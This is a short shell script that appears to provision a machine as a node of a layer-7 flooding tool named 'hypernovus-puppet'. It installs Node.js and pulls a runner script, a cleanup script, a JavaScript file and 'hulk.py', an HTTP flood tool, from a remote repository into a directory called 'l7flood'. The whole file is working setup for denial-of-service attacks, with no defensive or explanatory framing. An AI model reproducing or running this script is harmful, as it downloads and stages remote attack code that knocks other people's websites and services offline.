#!/bin/sh

JSURL=https://raw.githubusercontent.com/mehmetefeerkan/hypernovus-puppet/main/source/index.js
PYURL=https://raw.githubusercontent.com/mehmetefeerkan/hypernovus-puppet/main/source/hulk.py

RUNNERURL=https://raw.githubusercontent.com/mehmetefeerkan/hypernovus-puppet/main/runl7.sh
CLEANUPURL=https://raw.githubusercontent.com/mehmetefeerkan/hypernovus-puppet/main/cleanupl7.sh

apt install npm
apt install nodejs

wget $RUNNERURL
chmod +x runl7.sh

wget $CLEANUPURL
chmod +x cleanupl7.sh

mkdir l7flood
cd l7flood

npm install delay
npm install express

wget $JSURL
wget $PYURL



